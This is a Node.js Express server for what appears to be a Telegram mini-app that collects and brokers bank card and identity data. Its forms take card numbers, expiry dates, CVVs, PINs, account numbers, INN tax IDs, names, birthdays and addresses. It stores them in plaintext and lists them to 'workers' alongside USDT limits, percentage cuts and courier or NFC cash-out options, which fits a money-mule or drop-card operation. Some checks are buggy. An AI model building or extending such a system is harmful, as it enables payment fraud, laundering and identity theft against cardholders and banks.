const express = require('express');
const { validateInitData, parseInitData } = require('@gramio/init-data')
const https = require('https');
const knex = require('knex');
const config = require('./config');
const fs = require('fs');
const app = express();

const db = knex({
    client: 'pg',
    connection: config.database
})

app.use(express.static('src'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));


app.post('/sendForm', async (req,res) => {
    const {
        initData,
        method,
        block,
        actual,
        percent,
        limit,
        bank,
        cardNumber,
        accountNumber,
        inn,
        fullname,
        birthday,
        address,
        phoneNumber,
        expirationDate,
        cvv,
        pin
    } = req.body;
    if (!initData || !method || !block || !actual || !percent || !limit) {
        return res.status(400).json({ msg: 'Bad Request #1' });
    }
    if (!validateInitData(initData, config.token)) {
        return res.status(401).json({ msg: 'Unauthorized' });
    }
    if (!['cash','nfc','transfer','sberbank','card'].includes(method)) {
        return res.status(400).json({ msg: 'Bad Request #2' });
    }
    if (method == 'cash' && (!block || !actual || !percent || !limit || !address)) {
        return res.status(400).json({ msg: 'Bad Request #3' });
    }
    if (method == 'transfer' && (!accountNumber || !inn || !fullname || !birthday || !address)) {
        return res.status(400).json({ msg: 'Bad Request #4' });
    }
    if (method == 'card' && (!cardNumber || !bank || !accountNumber || !inn || !fullname || !birthday || !address)) {
        return res.status(400).json({ msg: 'Bad Request #5' });
    }
    if (method == 'nfc' && (!cardNumber || !bank || !phoneNumber || !expirationDate || !cvv || !pin || !accountNumber || !inn || !fullname || !birthday || !address)) {
        return res.status(400).json({ msg: 'Bad Request #6' });
    }
    if (method == 'sberbank' && (!cardNumber || !bank || !accountNumber || !inn || !fullname || !birthday || !address)) {
        return res.status(400).json({ msg: 'Bad Request #7' });
    }
    res.status(200).json({
        ok: true
    });
    const application = await db('applications')
        .insert({
            method: method,
            block: block.toString(),
            actual: actual.toString(),
            percent: percent.toString(),
            limit: limit.toString(),
            bank: bank,
            number: phoneNumber,
            card: cardNumber,
            expire: expirationDate,
            cvv: cvv,
            pin: pin,
            account: accountNumber,
            inn: inn,
            fullname: fullname,
            birthday: birthday,
            address: address,
            status: 'pending',
            userid: parseInitData(initData).user.id
        })
        .returning(['id'])
    // await fetch(config.requestURL, {
    //     method: 'post',
    //     headers: { 'content-type': 'application/json' },
    //     body: JSON.stringify({
    //         applicationId: application[0].id,
    //         answer1: garanty,
    //         answer2: percent,
    //         answer3: sum,
    //         answer4: method,
    //         answer5: fullname,
    //         answer6: birthday,
    //         answer7: address,
    //         answer8: accountNumber,
    //         answer9: inn,
    //         answer10: bank,
    //         answer11: cardNumber,
    //     })
    // })
})
app.post('/sendPayment', async (req,res) => {
    const {
        initData,
        method,
        block,
        actual,
        percent,
        limit,
        bank,
        address,
        details
    } = req.body;
    if (!initData || !method || !block || !actual || !percent || !limit) {
        return res.status(400).json({ msg: 'Bad Request #1' });
    }
    if (!validateInitData(initData, config.token)) {
        return res.status(401).json({ msg: 'Unauthorized' });
    }
    if (!['cash','nfc','transfer','sberbank','card'].includes(method)) {
        return res.status(400).json({ msg: 'Bad Request #2' });
    }
    if (method == 'cash' && (!address || !details)) {
        return res.status(400).json({ msg: 'Bad Request #3' });
    }
    if (method !== 'cash' && (!bank)) {
        return res.status(400).json({ msg: 'Bad Request #4' });
    }
    res.status(200).json({
        ok: true
    });
    const application = await db('workers_applications')
        .insert({
            method: method,
            block: block.toString(),
            actual: actual.toString(),
            percent: percent.toString(),
            limit: limit.toString(),
            bank: bank,
            address: address,
            details: details,
            status: 'pending',
            userid: parseInitData(initData).user.id
        })
        .returning(['id']);
    
})
app.post('/applications', async (req,res) => {
    const { initData } = req.body;
    
    if (!validateInitData(initData, config.token)) {
        return res.status(401).json({ msg: 'Unauthorized' });
    }

    const list = await db('applications')
        .where('status', 'pending')
        .select('*');

    res.status(200).json({
        ok: true,
        data: list.map(x => ({
            id: x.id,
            method: {
                cash: "💰 Курьер",
                nfc: "💰 Cash in / NFC",
                transfer: "💳 Перевод по счету",
                sberbank: "💳 Перевод по сбп",
                card: "💳 Перевод по карте",
            }[x.method],
            methodName: x.method,
            block: x.block=='true'?'Да':'Нет',
            actual: x.actual + ' час(ов)',
            percent: x.percent + '%',
            limit: x.limit + ' USDT',
            bank: {
                sberbank: "Сбербанк",
                tinkoff: "Тинькофф",
                ozon: "Озон",
                home: "Хоум",
                rosbank: "Росбанк",
                uralbank: "Уралбанк",
                alfabank: "Альфабанк",
                vtbbank: "ВТБ банк",
                raiffaisen: "Райффайзен",
                pochtabank: "Почтабанк",
                mtsbank: "МТС банк",
                sovkombank: "Совком банк"
            }[x.bank],
            number: x.number,
            card: x.card,
            expire: x.expire,
            cvv: x.cvv,
            pin: x.pin,
            account: x.account,
            inn: x.inn,
            fullname: x.fullname,
            birthday: x.birthday,
            address: x.address
        }))
    })
})
app.post('/actual', async (req,res) => {
    const { initData } = req.body;
    
    if (!validateInitData(initData, config.token)) {
        return res.status(401).json({ msg: 'Unauthorized' });
    }

    const list = await db('workers_applications')
        .where('status', 'pending')
        .select('*');

    res.status(200).json({
        ok: true,
        data: list.map(x => ({
            id: x.id,
            method: {
                cash: "💰 Курьер",
                nfc: "💰 Cash in / NFC",
                transfer: "💳 Перевод по счету",
                sberbank: "💳 Перевод по сбп",
                card: "💳 Перевод по карте",
            }[x.method],
            methodName: x.method,
            block: x.block=='true'?'Да':'Нет',
            actual: x.actual + ' час(ов)',
            percent: x.percent + '%',
            limit: x.limit + ' USDT',
            bank: {
                sberbank: "Сбербанк",
                tinkoff: "Тинькофф",
                ozon: "Озон",
                home: "Хоум",
                rosbank: "Росбанк",
                uralbank: "Уралбанк",
                alfabank: "Альфабанк",
                vtbbank: "ВТБ банк",
                raiffaisen: "Райффайзен",
                pochtabank: "Почтабанк",
                mtsbank: "МТС банк",
                sovkombank: "Совком банк"
            }[x.bank],
            address: x.address,
            details: x.details
        }))
    })
})
app.post('/claim', async (req, res) => {
    const { id, initData } = req.body;
    if (!validateInitData(initData, config.token)) {
        return res.status(401).json({ msg: 'Unauthorized' });
    }
    if (!id) return res.status(400).json({ msg: 'Bad Request #1' });
    const application = await db('applications')
        .where('id', id)
        .select('*');
    if(!application) return res.status(400).json({ msg: 'Bad Request #2' });
    if (application.status != 'pending') return res.status(400).json({ msg: 'Bad Request #3' });
    await db('applications')
        .where('id', id)
        .update({
            status: 'onwork'
        });
    res.status(200).json({
        ok: true
    });
});
app.post('/get', async (req, res) => {
    const { id, initData } = req.body;
    if (!validateInitData(initData, config.token)) {
        return res.status(401).json({ msg: 'Unauthorized' });
    }
    if (!id) return res.status(400).json({ msg: 'Bad Request #1' });
    const application = await db('workers_applications')
        .where('id', id)
        .select('*');
    if(!application) return res.status(400).json({ msg: 'Bad Request #2' });
    if (application.status != 'pending') return res.status(400).json({ msg: 'Bad Request #3' });
    await db('workers_applications')
        .where('id', id)
        .update({
            status: 'onwork'
        });
    res.status(200).json({
        ok: true
    });
});
app.post('/additionalWorkerData', async (req, res) => {
    const { id, initData, address, details } = req.body;
    if (!initData || !address || !details || !id) {
        return res.status(400).json({ msg: 'Bad Request #1' });
    }
    if (!validateInitData(initData, config.token)) {
        return res.status(401).json({ msg: 'Unauthorized' });
    }
    if (!id) return res.status(400).json({ msg: 'Bad Request #1' });
    const application = await db('workers_applications')
        .where('id', id)
        .select('*');
    if(!application) return res.status(400).json({ msg: 'Bad Request #2' });
    await db('workers_applications')
        .where('id', id)
        .update({
            status: 'closed'
        });
    await db('deals').insert({
        application: application.id,
        address: address,
        details: details,
        user: parseInitData(initData).user.id
    });
    res.status(200).json({
        ok: true
    });

})
app.post('/additionalClientData', async (req, res) => {
    const { id, initData, number, card, expire, cvv, pin, account, inn, fullname, birthday, address } = req.body;
    if (!initData || !id || !card || !account || !fullname || !birthday || !address) {
        return res.status(400).json({ msg: 'Bad Request #1' });
    }
    if (!validateInitData(initData, config.token)) {
        return res.status(401).json({ msg: 'Unauthorized' });
    }
    if (!id) return res.status(400).json({ msg: 'Bad Request #1' });
    const application = await db('workers_applications')
        .where('id', id)
        .select('*');
    if(!application) return res.status(400).json({ msg: 'Bad Request #2' });
    await db('workers_applications')
        .where('id', id)
        .update({
            status: 'closed'
        });
    await db('deals').insert({
        application: application.id,
        number: number,
        card: card,
        expire: expire,
        cvv: cvv,
        pin: pin,
        account: account,
        inn: inn,
        fullname: fullname,
        birthday: birthday,
        address: address,
        user: parseInitData(initData).user.id
    });
    res.status(200).json({
        ok: true
    });

})


https.createServer({
    key: fs.readFileSync('server.key'),
    cert: fs.readFileSync('server.crt'),
}, app).listen(80, () => {
    console.log('Server is running');
});